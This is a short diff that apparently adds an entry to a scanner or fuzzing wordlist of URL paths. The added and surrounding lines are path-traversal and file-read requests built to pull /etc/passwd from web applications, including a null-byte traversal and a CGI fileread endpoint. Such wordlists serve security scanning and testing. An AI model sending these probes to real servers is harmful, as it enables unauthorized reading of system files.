@@ -39,3 +39,4 @@
 /CDGServer3/ClientAjax
 /.%00./.%00./etc/passwd
 /index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd
+/cgi-bin/operator/fileread?READ.filePath=/etc/passwd
